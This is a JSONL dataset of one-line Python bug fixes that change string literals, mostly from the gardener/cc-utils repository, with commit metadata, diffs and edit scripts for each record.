{"project": "v2ray.fun", "commit_sha": "08559c30e9ea208dc75fafce7c3c88a2fb24c64a", "parent_sha": "a7dc23a0e70ee308e15a99f573ecc983ec017374", "file_path": "client.py", "project_url": "https://github.com/Jrohy/v2ray.fun", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -8,7 +8,7 @@ from group import Vmess, Socks, SS, Mtproto\n from selector import ClientSelector\n \n class ClientWriter:\n-    def __init__(self, group, client_index, write_path='/root/config.json', config_path='/etc/v2ray/config.json', template_path='json_template'):\n+    def __init__(self, group, client_index, write_path='/root/config.json', config_path='/etc/v2ray/config.json', template_path='/usr/local/multi-v2ray/json_template'):\n         with open(config_path, 'r') as json_file:\n             self.config = json.load(json_file)\n         self.write_path = write_path\n", "before": "def __init__ ( self , group , client_index , write_path = '/root/config.json' , config_path = '/etc/v2ray/config.json' , template_path = 'json_template' ) : with open ( config_path , 'r' ) as json_file : self . config = json . load ( json_file ) self . write_path = write_path", "after": "def __init__ ( self , group , client_index , write_path = '/root/config.json' , config_path = '/etc/v2ray/config.json' , template_path = '/usr/local/multi-v2ray/json_template' ) : with open ( config_path , 'r' ) as json_file : self . config = json . load ( json_file ) self . write_path = write_path", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'json_template'\", 3, 129, 3, 144], \"'/usr/local/multi-v2ray/json_template'\"]]"}
{"project": "v2ray.fun", "commit_sha": "dce6b6dabe6cf5790c2662822144592687f037cd", "parent_sha": "08559c30e9ea208dc75fafce7c3c88a2fb24c64a", "file_path": "loader.py", "project_url": "https://github.com/Jrohy/v2ray.fun", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -6,7 +6,7 @@ import pickle\n from profile import Profile\n \n class Loader:\n-    def __init__(self, path='multi-v2ray.dat'):\n+    def __init__(self, path='/usr/local/multi-v2ray/multi-v2ray.dat'):\n         self.path = path\n         self.profile=None\n         self.load_profile()\n", "before": "def __init__ ( self , path = 'multi-v2ray.dat' ) : self . path = path self . profile = None self . load_profile ( )", "after": "def __init__ ( self , path = '/usr/local/multi-v2ray/multi-v2ray.dat' ) : self . path = path self . profile = None self . load_profile ( )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'multi-v2ray.dat'\", 3, 29, 3, 46], \"'/usr/local/multi-v2ray/multi-v2ray.dat'\"]]"}
{"project": "Skynet2.0", "commit_sha": "57af05fd66738f29e9dd6656d0593bfe3c5bb1d4", "parent_sha": "65e7ba3da954944528612152c5d1a805f36653c8", "file_path": "ssh/install.py", "project_url": "https://github.com/Skynet2-0/Skynet2.0", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -38,7 +38,7 @@ class Installer(object):\n         print('Start installing.')\n         (_, out0, err0) = self.ssh.run('apt-get update')\n         self._checkStreams(out0, err0, 'apt update failed', 'apt updated.')\n-        (_, out0, err0) = self.ssh.run('apt-get install -y git')\n+        (_, out0, err0) = self.ssh.run('apt-get install -y --force-yes git')\n         self._checkStreams(out0, err0, 'git install failed', 'git installed.')\n         command = 'git clone --recursive https://github.com/Skynet2-0/Skynet2.0.git'\n         (_, out0, err0) = self.ssh.run(command)\n", "before": "( _ , out0 , err0 ) = self . ssh . run ( 'apt-get install -y git' )", "after": "( _ , out0 , err0 ) = self . ssh . run ( 'apt-get install -y --force-yes git' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'apt-get install -y git'\", 3, 40, 3, 64], \"'apt-get install -y --force-yes git'\"]]"}
{"project": "cc-utils", "commit_sha": "aefb3c25e617106380451e96639bbe12ad1d4a59", "parent_sha": "cb27cd8cdf1ae5cf1a04fd8efd14249a2db87ffa", "file_path": "gitutil.py", "project_url": "https://github.com/gardener/cc-utils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -76,7 +76,7 @@ class GitHelper(object):\n             with open(tmp_id, 'w') as f:\n                 f.write(self.github_cfg.credentials().private_key())\n             os.chmod(tmp_id, 0o400)\n-            os.environ['GIT_SSH_CMD'] = 'ssh -i {id_file} {suppress_hostcheck}'.format(\n+            os.environ['GIT_SSH_COMMAND'] = 'ssh -i {id_file} {suppress_hostcheck}'.format(\n                 id_file=tmp_id,\n                 suppress_hostcheck='-o \"StrictHostKeyChecking no\"',\n             )\n", "before": "os . environ [ 'GIT_SSH_CMD' ] = 'ssh -i {id_file} {suppress_hostcheck}' . format ( id_file = tmp_id , suppress_hostcheck = '-o \"StrictHostKeyChecking no\"' , )", "after": "os . environ [ 'GIT_SSH_COMMAND' ] = 'ssh -i {id_file} {suppress_hostcheck}' . format ( id_file = tmp_id , suppress_hostcheck = '-o \"StrictHostKeyChecking no\"' , )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'GIT_SSH_CMD'\", 3, 24, 3, 37], \"'GIT_SSH_COMMAND'\"]]"}
{"project": "cc-utils", "commit_sha": "93cedb8d5b264a96c3213d28c95693d2c3116d52", "parent_sha": "aefb3c25e617106380451e96639bbe12ad1d4a59", "file_path": "gitutil.py", "project_url": "https://github.com/gardener/cc-utils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -92,7 +92,7 @@ class GitHelper(object):\n         finally:\n             if use_ssh:\n                 os.unlink(tmp_id)\n-                del os.environ['GIT_SSH_CMD']\n+                del os.environ['GIT_SSH_COMMAND']\n \n \n def clone_repository(\n", "before": "del os . environ [ 'GIT_SSH_CMD' ]", "after": "del os . environ [ 'GIT_SSH_COMMAND' ]", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'GIT_SSH_CMD'\", 3, 32, 3, 45], \"'GIT_SSH_COMMAND'\"]]"}
{"project": "cc-utils", "commit_sha": "e1f51454120c68198789067305d0734535e893f8", "parent_sha": "c81229e1220eb7c589f5ff49077ff609aae78530", "file_path": "test/concourse/client_test.py", "project_url": "https://github.com/gardener/cc-utils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -38,7 +38,7 @@ class ConcourseApiRoutesTest(unittest.TestCase):\n     def test_login_route(self):\n         self.assertEqual(\n             self.examinee.login(),\n-            'https://made-up-concourse.com/api/v1/teams/foo/auth/token'\n+            'https://made-up-concourse.com/auth/basic/token?team_name=foo'\n         )\n \n     def test_pipelines_route(self):\n", "before": "self . assertEqual ( self . examinee . login ( ) , 'https://made-up-concourse.com/api/v1/teams/foo/auth/token' )", "after": "self . assertEqual ( self . examinee . login ( ) , 'https://made-up-concourse.com/auth/basic/token?team_name=foo' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'https://made-up-concourse.com/api/v1/teams/foo/auth/token'\", 3, 13, 3, 72], \"'https://made-up-concourse.com/auth/basic/token?team_name=foo'\"]]"}
{"project": "cc-utils", "commit_sha": "faff8e6af9d4af1bc01411ce4d9659f3291f1066", "parent_sha": "adbd43b0fe774ce0df492b416385cbbedb902a19", "file_path": "test/concourse/steps/test_utils.py", "project_url": "https://github.com/gardener/cc-utils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -69,7 +69,7 @@ def populate_meta_dir(directory:str):\n         'build-job-name',\n         'build-team-name',\n         'build-pipeline-name',\n-        'atc-externalal-url',\n+        'atc-external-url',\n     ):\n         with open(os.path.join(directory, n), 'w') as f:\n             f.write(n)\n", "before": "'atc-externalal-url' ,", "after": "'atc-external-url' ,", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'atc-externalal-url'\", 3, 9, 3, 29], \"'atc-external-url'\"]]"}
{"project": "cc-utils", "commit_sha": "b93f5e8857e92683e83668f1220754909e54c0b6", "parent_sha": "bfb4c6ac15b530b9618d91d49fdd7d457de81a82", "file_path": "whd/dispatcher.py", "project_url": "https://github.com/gardener/cc-utils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -132,7 +132,7 @@ class GithubWebhookDispatcher(object):\n             require_label = resource.source.get('label')\n             if require_label:\n                 if require_label not in pr_event.label_names():\n-                    util.info('skipping PR resource update (required label not present')\n+                    util.info('skipping PR resource update (required label not present)')\n                     # regardless of whether or not the resource is up-to-date, it would not\n                     # be discovered by concourse's PR resource due to policy\n                     return True\n", "before": "util . info ( 'skipping PR resource update (required label not present' )", "after": "util . info ( 'skipping PR resource update (required label not present)' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'skipping PR resource update (required label not present'\", 3, 31, 3, 88], \"'skipping PR resource update (required label not present)'\"]]"}
{"project": "cc-utils", "commit_sha": "4150a6bdb7524f68c209146a1afa1619cbafa23e", "parent_sha": "2b290b02256e69709fc1fc82999e1f74f468228c", "file_path": "whd/dispatcher.py", "project_url": "https://github.com/gardener/cc-utils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -55,7 +55,7 @@ class GithubWebhookDispatcher(object):\n \n     def _update_pipeline_definition(self, push_event):\n         # for now, just log - actual update to be implemented\n-        app.logger.info('pipeline definition update found - should not update')\n+        app.logger.info('pipeline definition update found - should now update')\n \n     def _pipeline_definition_changed(self, push_event):\n         if '.ci/pipeline_definitions' in push_event.modified_paths():\n", "before": "app . logger . info ( 'pipeline definition update found - should not update' )", "after": "app . logger . info ( 'pipeline definition update found - should now update' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'pipeline definition update found - should not update'\", 3, 25, 3, 79], \"'pipeline definition update found - should now update'\"]]"}
{"project": "cc-utils", "commit_sha": "9f4efc1d4640b64bd6b80f7495b1d5dedfce72cc", "parent_sha": "405c87421fac866c45893ac48427476399d19b96", "file_path": "mail/template_mailer.py", "project_url": "https://github.com/gardener/cc-utils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -37,7 +37,7 @@ def create_mail(\n         recipients: [str],\n         text: str,\n         cc_recipients: [str]=[],\n-        mail_type: str='html'\n+        mail_type: str='plain'\n     )->MIMEText:\n     msg = MIMEText(text, mail_type)\n     msg['Subject'] = subject\n", "before": "recipients : [ str ] , text : str , cc_recipients : [ str ] = [ ] , mail_type : str = 'html'", "after": "recipients : [ str ] , text : str , cc_recipients : [ str ] = [ ] , mail_type : str = 'plain'", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'html'\", 3, 24, 3, 30], \"'plain'\"]]"}
{"project": "cc-utils", "commit_sha": "3ab68561da69f8a9874cf4109740b0068f7b373c", "parent_sha": "496cbd997666a3964ac89ba09556269baf9e5b79", "file_path": "concourse/pipelines/model/traits/pullrequest.py", "project_url": "https://github.com/gardener/cc-utils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -14,7 +14,7 @@ class PullRequestTrait(Trait):\n     def policies(self):\n         policies_dict = self.raw.get('policies')\n         if not policies_dict:\n-            policies_dict = {'require-label': 'ok-to-test'}\n+            policies_dict = {'require-label': 'reviewed/ok-to-test'}\n \n         return PullRequestPolicies(raw_dict=policies_dict)\n \n", "before": "policies_dict = { 'require-label' : 'ok-to-test' }", "after": "policies_dict = { 'require-label' : 'reviewed/ok-to-test' }", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'ok-to-test'\", 3, 47, 3, 59], \"'reviewed/ok-to-test'\"]]"}
{"project": "cc-utils", "commit_sha": "c6471fa2887fbb4182e20c378c4bcbb9f206b073", "parent_sha": "813335086ff701384f7349f2e039d8aeff3cc3e2", "file_path": "concourse/model/traits/image_scan.py", "project_url": "https://github.com/gardener/cc-utils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -128,7 +128,7 @@ class ImageScanTrait(Trait):\n         return set(AttributeSpec.required_attr_names(ATTRIBUTES))\n \n     def reference_protecode_group_ids(self):\n-        return self.raw['reference_protecode_group_id']\n+        return self.raw['reference_protecode_group_ids']\n \n     def protecode_group_id(self):\n         return self.raw.get('protecode_group_id')\n", "before": "return self . raw [ 'reference_protecode_group_id' ]", "after": "return self . raw [ 'reference_protecode_group_ids' ]", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'reference_protecode_group_id'\", 3, 25, 3, 55], \"'reference_protecode_group_ids'\"]]"}
{"project": "cc-utils", "commit_sha": "52c895f08399a6a0d20a37f8e1998e677b3f5492", "parent_sha": "93be91f4a387b89cd348c939e16dd3a1318f46db", "file_path": "clamav/util.py", "project_url": "https://github.com/gardener/cc-utils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -88,7 +88,7 @@ def scan_container_image(image_reference: str):\n                 continue\n             else:\n                 # early exit on first match\n-                return status, f'{ti.name}: signature'\n+                return status, f'{ti.name}: {signature}'\n         logger.debug(f'image looked clean: {image_reference}')\n         return 'OK', None # no match\n \n", "before": "status , f'{ti.name}: signature'", "after": "status , f'{ti.name}: {signature}'", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:f'{ti.name}: signature'\", 3, 32, 3, 55], \"f'{ti.name}: {signature}'\"]]"}
{"project": "cc-utils", "commit_sha": "edc26aa554840e14e4158e6a98c393dac2623028", "parent_sha": "df4bd24b2768b18a94b570bf2b93bdae347785bd", "file_path": "concourse/steps/scan_container_images.py", "project_url": "https://github.com/gardener/cc-utils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -79,7 +79,7 @@ class MailRecipients(object):\n             <div>\n               <p>\n               Note: you receive this E-Mail, because you were configured as a mail recipient\n-              in repository \"{self.root_component_name}\" (see .ci/pipeline_definitions)\n+              in repository \"{self._root_component_name}\" (see .ci/pipeline_definitions)\n               To remove yourself, search for your e-mail address in said file and remove it.\n               </p>\n               <p>\n", "before": "\"{self.root_component_name}\" ( see . ci / pipeline_definitions )", "after": "\"{self._root_component_name}\" ( see . ci / pipeline_definitions )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:\\\"{self.root_component_name}\\\"\", 3, 29, 3, 57], \"\\\"{self._root_component_name}\\\"\"]]"}
{"project": "MATRIX", "commit_sha": "1fd5d66cc7f264b59d47b0eb3a4ace86d4a920fe", "parent_sha": "2df08bea0ba35e916c4d7a03fe6724c43736e2b8", "file_path": "WebApp/app.py", "project_url": "https://github.com/cryptobiu/MATRIX", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -213,7 +213,7 @@ def execute_deployment_operation(protocol_name, operation):\n     except errors.OperationFailure:\n         return jsonify(f'Update deploy configuration for {protocol_name} failed', 500)\n     except botocore.exceptions.ClientError as e:\n-        return jsonify('Error occurred during instance creation', 500)\n+        return jsonify(f'{str(e)}', 500)\n \n \n @app.route('/api/execution/update/<string:protocol_name>', methods=['POST'])\n", "before": "jsonify ( 'Error occurred during instance creation' , 500 )", "after": "jsonify ( f'{str(e)}' , 500 )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'Error occurred during instance creation'\", 3, 24, 3, 65], \"f'{str(e)}'\"]]"}
{"project": "videofeatures", "commit_sha": "c7a0b09bc4da9ec1e7c737610fbafe7b5d0c5958", "parent_sha": "1391403e197a037d5ce41612df66ce1c28d91115", "file_path": "STIP_Features/Read_STIP_Features.py", "project_url": "https://github.com/jonasrothfuss/videofeatures", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -74,7 +74,7 @@ def readSIFTFeatureFile(file_path, n_descriptors=30, pickle_path=None):\n     return features, labels\n \n def main():\n-  readSIFTFeatureFile(SIFT_FEAT_FILE, pickle_path=os.path.join(FeatureDumpsDir, '20bn_val_sift.pickle'))\n+  readSIFTFeatureFile(SIFT_FEAT_FILE, pickle_path=os.path.join(FeatureDumpsDir, 'stip_20bn_val.pickle'))\n \n if __name__ == '__main__':\n   main()\n\\ No newline at end of file\n", "before": "readSIFTFeatureFile ( SIFT_FEAT_FILE , pickle_path = os . path . join ( FeatureDumpsDir , '20bn_val_sift.pickle' ) )", "after": "readSIFTFeatureFile ( SIFT_FEAT_FILE , pickle_path = os . path . join ( FeatureDumpsDir , 'stip_20bn_val.pickle' ) )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'20bn_val_sift.pickle'\", 3, 81, 3, 103], \"'stip_20bn_val.pickle'\"]]"}
{"project": "kannel_exporter", "commit_sha": "964e21c6560a1835351347b4f71bda2d67e83da9", "parent_sha": "4a3e1854d8bcd2d3bdaab58186c6fdce3149e96e", "file_path": "kannel_exporter.py", "project_url": "https://github.com/apostvav/kannel_exporter", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -328,7 +328,7 @@ def cli():\n                         default=os.environ.get('KANNEL_HOST', 'http://127.0.0.1:13000'))\n     parser.add_argument('--port', dest='port', type=int,\n                         help='Exporter port. (default 9390)',\n-                        default=int(os.environ.get('KANNEL_EXPORTER_PORT', '9405')))\n+                        default=int(os.environ.get('KANNEL_EXPORTER_PORT', '9390')))\n     parser.add_argument('--filter-smscs', dest='filter_smsc', action='store_true',\n                         help='Filter out SMSC metrics')\n", "before": "default = os . environ . get ( 'KANNEL_HOST' , 'http://127.0.0.1:13000' ) ) parser . add_argument ( '--port' , dest = 'port' , type = int , help = 'Exporter port. (default 9390)' , default = int ( os . environ . get ( 'KANNEL_EXPORTER_PORT' , '9405' ) ) )", "after": "default = os . environ . get ( 'KANNEL_HOST' , 'http://127.0.0.1:13000' ) ) parser . add_argument ( '--port' , dest = 'port' , type = int , help = 'Exporter port. (default 9390)' , default = int ( os . environ . get ( 'KANNEL_EXPORTER_PORT' , '9390' ) ) )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'9405'\", 3, 76, 3, 82], \"'9390'\"]]"}
{"project": "cc-utils", "commit_sha": "4ddb5bc4cb8cf58b0d92ccad78b9a3cac869ea5b", "parent_sha": "75b309498ff83f5245c7e6877826aea4f1808f14", "file_path": "product/scanning.py", "project_url": "https://github.com/gardener/cc-utils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -455,7 +455,7 @@ class ProtecodeUtil(object):\n                     yield from vulnerability.triages()\n \n     def _import_triages_from_gcr(self, scan_result: AnalysisResult):\n-        image_ref = scan_result.custom_data().get('IMAGE_REFERENCE_NAME', None)\n+        image_ref = scan_result.custom_data().get('IMAGE_REFERENCE', None)\n         if not image_ref:\n             logging.warning(f'no image-ref-name custom-prop for {scan_result.product_id()}')\n             return scan_result\n", "before": "image_ref = scan_result . custom_data ( ) . get ( 'IMAGE_REFERENCE_NAME' , None )", "after": "image_ref = scan_result . custom_data ( ) . get ( 'IMAGE_REFERENCE' , None )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'IMAGE_REFERENCE_NAME'\", 3, 51, 3, 73], \"'IMAGE_REFERENCE'\"]]"}
{"project": "cc-utils", "commit_sha": "0c9188308203dde30f4ffda02b0e9d962a8c2f28", "parent_sha": "df323b3ace68eb7eb091e79a3054c9e4ef3df99c", "file_path": "protecode/scanning_util.py", "project_url": "https://github.com/gardener/cc-utils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -478,7 +478,7 @@ class ProtecodeUtil:\n \n         if worst_cvss >= self.cvss_threshold:\n             ci.util.info(f'GCR\\'s worst CVSS rating is above threshold: {worst_cvss}')\n-            ci.util.info(f'however, consider: {worst_effective_vuln}')\n+            ci.util.info(f'however, consider: {worst_effective_vuln=}')\n             return scan_result # do not import triages (although we could, considering components)\n \n         # if this line is reached, all vulnerabilities are considered to be less severe than\n", "before": "ci . util . info ( f'however, consider: {worst_effective_vuln}' )", "after": "ci . util . info ( f'however, consider: {worst_effective_vuln=}' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:f'however, consider: {worst_effective_vuln}'\", 3, 26, 3, 70], \"f'however, consider: {worst_effective_vuln=}'\"]]"}
{"project": "cc-utils", "commit_sha": "a2d56c1e5b478d9f427806d6689978f556ebd233", "parent_sha": "bf3e2d4b523194fbf59af79dec534fc099c67699", "file_path": "protecode/scanning_util.py", "project_url": "https://github.com/gardener/cc-utils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -555,7 +555,7 @@ class ProtecodeUtil:\n                         )\n                         triaged_due_to_absent_count += 1\n                         description = \\\n-                            '[ci] vulnerability was not reported by GCR at {image_ref}'\n+                            f'[ci] vulnerability was not reported by GCR at {image_ref}'\n                     elif worst_cve >= self.cvss_threshold:\n                         triaged_due_to_gcr_optimism += 1\n                         ci.util.info(\n", "before": "description = '[ci] vulnerability was not reported by GCR at {image_ref}'", "after": "description = f'[ci] vulnerability was not reported by GCR at {image_ref}'", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'[ci] vulnerability was not reported by GCR at {image_ref}'\", 3, 29, 3, 88], \"f'[ci] vulnerability was not reported by GCR at {image_ref}'\"]]"}
{"project": "cc-utils", "commit_sha": "d2bc61e28ca7e79f4674d24f06732a745dba8f54", "parent_sha": "da586146226d3137f39532599dd2ddf2576e256f", "file_path": "cli/gardener_ci/test/cli_test.py", "project_url": "https://github.com/gardener/cc-utils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -50,4 +50,4 @@ def test_smoke():\n \n     assert result.returncode == 0\n     assert result.stderr.strip() == ''\n-    assert result.stdout.strip().startswith('usage: cli.py')\n+    assert result.stdout.strip().startswith('usage: cli_gen.py')\n", "before": "assert result . stdout . strip ( ) . startswith ( 'usage: cli.py' )", "after": "assert result . stdout . strip ( ) . startswith ( 'usage: cli_gen.py' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'usage: cli.py'\", 3, 45, 3, 60], \"'usage: cli_gen.py'\"]]"}
{"project": "cc-utils", "commit_sha": "cf4b30764e13919678022ed1e90722bdf7a1a85c", "parent_sha": "c40824e112c12dbb828c36f833b6c6223bf48048", "file_path": "version.py", "project_url": "https://github.com/gardener/cc-utils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -71,7 +71,7 @@ def parse_to_semver(\n \n def _parse_to_semver_and_metadata(version: str):\n     def raise_invalid():\n-        raise ValueError(f'not a valid (semver) version: {version}')\n+        raise ValueError(f'not a valid (semver) version: `{version}`')\n \n     if not version:\n         raise_invalid()\n", "before": "raise ValueError ( f'not a valid (semver) version: {version}' )", "after": "raise ValueError ( f'not a valid (semver) version: `{version}`' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:f'not a valid (semver) version: {version}'\", 3, 26, 3, 68], \"f'not a valid (semver) version: `{version}`'\"]]"}
{"project": "cc-utils", "commit_sha": "8fcd361061029077f86453b3ccdf8fe3dd292c0d", "parent_sha": "1e779eaa7040749b32ed21f9b2e03b09f096d501", "file_path": "test/concourse/steps/update_component_deps_test.py", "project_url": "https://github.com/gardener/cc-utils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -49,7 +49,7 @@ class UpdateComponentDependenciesStepTest(unittest.TestCase):\n         )\n \n         # try to compile (-> basic syntax check)\n-        return compile(step_snippet, 'component_descriptor.mako', 'exec')\n+        return compile(step_snippet, 'update_component_deps.mako', 'exec')\n \n \n def test_current_product_descriptor(tmpdir):\n", "before": "return compile ( step_snippet , 'component_descriptor.mako' , 'exec' )", "after": "return compile ( step_snippet , 'update_component_deps.mako' , 'exec' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'component_descriptor.mako'\", 3, 38, 3, 65], \"'update_component_deps.mako'\"]]"}
{"project": "cc-utils", "commit_sha": "f9af164559b25ae0aa0cf9d4c12e4b9e8864d28e", "parent_sha": "8db140ce8a171dbc7f1f34ae0a07d9fa52c1b4f9", "file_path": "container/registry.py", "project_url": "https://github.com/gardener/cc-utils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -431,7 +431,7 @@ def pulled_image(image_reference: str):\n           yield v2_2_img\n           return\n \n-    raise OciImageNotFoundException('failed to retrieve {image_reference=} - does it exist?')\n+    raise OciImageNotFoundException(f'failed to retrieve {image_reference=} - does it exist?')\n \n   except Exception as e:\n     raise e\n", "before": "raise OciImageNotFoundException ( 'failed to retrieve {image_reference=} - does it exist?' )", "after": "raise OciImageNotFoundException ( f'failed to retrieve {image_reference=} - does it exist?' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'failed to retrieve {image_reference=} - does it exist?'\", 3, 37, 3, 93], \"f'failed to retrieve {image_reference=} - does it exist?'\"]]"}
{"project": "cc-utils", "commit_sha": "925e08fdec850f5fd1659f47d9773491f2286b6e", "parent_sha": "6f2e7e42698b566d9976215d3b49512beb427bb1", "file_path": "checkmarx/project.py", "project_url": "https://github.com/gardener/cc-utils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -43,7 +43,7 @@ class CheckmarxProject:\n \n         if scan_response.status_value() is not model.ScanStatusValues.FINISHED:\n             logger.error(f'scan for {self.artifact_name} failed with {scan_response.status=}')\n-            raise RuntimeError('Scan of artifact {artifact_name} finished with errors')\n+            raise RuntimeError(f'Scan of artifact \"{self.artifact_name}\" finished with errors')\n \n         clogger = checkmarx.util.component_logger(artifact_name=self.artifact_name)\n         clogger.info('scan finished. Retrieving scan statistics')\n", "before": "raise RuntimeError ( 'Scan of artifact {artifact_name} finished with errors' )", "after": "raise RuntimeError ( f'Scan of artifact \"{self.artifact_name}\" finished with errors' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'Scan of artifact {artifact_name} finished with errors'\", 3, 32, 3, 87], \"f'Scan of artifact \\\"{self.artifact_name}\\\" finished with errors'\"]]"}
{"project": "cc-utils", "commit_sha": "4dd212065a40285e71f367133d0fe09d38fa2c29", "parent_sha": "f19254bccdcf7789d81fd7b4b58e7f6222c47d77", "file_path": "cli/gardener_ci/landscape.py", "project_url": "https://github.com/gardener/cc-utils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -80,7 +80,7 @@ def deploy_or_upgrade_landscape(\n     )=None,\n     whitesource_backend_deployment_name: CliHint(\n         typehint=str, help=\"namespace and deployment name for Whitesource\"\n-    )='whitesource_backend',\n+    )='whitesource-backend',\n     whitesource_cfg_name: CliHint(\n         typehint=str,\n         help='Whitesource Config',\n", "before": "whitesource_backend_deployment_name : CliHint ( typehint = str , help = \"namespace and deployment name for Whitesource\" ) = 'whitesource_backend' ,", "after": "whitesource_backend_deployment_name : CliHint ( typehint = str , help = \"namespace and deployment name for Whitesource\" ) = 'whitesource-backend' ,", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'whitesource_backend'\", 3, 7, 3, 28], \"'whitesource-backend'\"]]"}
{"project": "cc-utils", "commit_sha": "bdf0fe0481d009d3f9cfe8d5a4f7a11a7916f143", "parent_sha": "4b1f814f8ee91937540383e6d36a0b4de6ed7ba6", "file_path": "concourse/model/traits/image_scan.py", "project_url": "https://github.com/gardener/cc-utils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -193,7 +193,7 @@ class ImageScanTrait(Trait, ImageFilterMixin):\n         super().validate()\n         if not (self.protecode() or self.clam_av()):\n             raise ModelValidationError(\n-                f\"{self}: One of 'protecode' or 'clam_av' must be defined.\"\n+                \"at least one of 'protecode' or 'clam_av' must be defined.\"\n             )\n \n \n", "before": "raise ModelValidationError ( f\"{self}: One of 'protecode' or 'clam_av' must be defined.\" )", "after": "raise ModelValidationError ( \"at least one of 'protecode' or 'clam_av' must be defined.\" )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:f\\\"{self}: One of 'protecode' or 'clam_av' must be defined.\\\"\", 3, 17, 3, 76], \"\\\"at least one of 'protecode' or 'clam_av' must be defined.\\\"\"]]"}
{"project": "cc-utils", "commit_sha": "f28445634d191d255cefe47847ae3c8936067eb4", "parent_sha": "c9d25dfea8585bae60727785da72decc4505482b", "file_path": "ccc/oci.py", "project_url": "https://github.com/gardener/cc-utils", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -88,7 +88,7 @@ class _OciRequestHandler(logging.Handler):\n             )\n         except:\n             logger.warning(traceback.format_exc())\n-            logger.warning('could not sent oci request log to elastic search')\n+            logger.warning('could not send oci request log to elastic search')\n \n \n _client_sentinel = object()\n", "before": "logger . warning ( 'could not sent oci request log to elastic search' )", "after": "logger . warning ( 'could not send oci request log to elastic search' )", "sstub_pattern": "CHANGE_STRING_LITERAL", "edit_script": "[[\"Update\", [\"string:'could not sent oci request log to elastic search'\", 3, 28, 3, 78], \"'could not send oci request log to elastic search'\"]]"}
